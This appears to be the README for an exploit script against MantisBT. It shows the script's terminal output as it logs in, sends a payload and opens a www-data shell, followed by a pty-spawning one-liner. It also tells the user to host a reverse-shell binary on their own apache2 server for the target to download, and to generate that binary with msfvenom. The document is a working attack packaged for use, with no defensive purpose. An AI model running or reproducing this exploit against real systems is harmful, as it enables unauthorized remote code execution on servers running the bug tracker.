# README

    root@ch3rn0byl:~/Desktop# python MantisBT.py 
    [+] Pew pew pewwwww!!!
    [+] Logging in...
    [+] Request: 200 OK
    [+] Sending payload...
    python -c 'import pty ; pty.spawn("/bin/bash")'
    www-data@ubuntu:/var/www/html/mantisbt$ 


This was on an install of Mantis. The paths may differ depending on how you set up soo change them!
It will present you an empty prompt, but you will be in shell :)
Just spawn a pty and you should be golden    

# Requirements
Also, this is using a reverse shell. 
So make sure that you have apache2 running because it will grab it from you    
You can use one from msfvenom:    
msfvenom -p payload -f elf etc etc etcccc
